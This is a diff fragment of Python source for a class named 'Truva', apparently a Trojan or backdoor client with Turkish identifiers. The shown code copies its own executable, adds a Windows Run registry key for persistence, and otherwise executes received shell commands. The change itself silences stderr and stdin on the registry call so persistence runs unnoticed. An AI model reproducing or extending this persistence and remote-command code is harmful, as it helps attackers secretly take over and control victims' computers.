@@ -34,7 +34,7 @@ class Truva:
                 if not os.path.exists(dosya_uzantisi):
                     shutil.copyfile(sys.executable,dosya_uzantisi)
                     kayit = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + komut[1] + " /t REG_SZ /d " + dosya_uzantisi
-                    subprocess.call(kayit, shell=True)
+                    subprocess.call(kayit, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                 return "Başarıyla Yerleşti."
             else:
                 return subprocess.check_output(komut, shell=True)
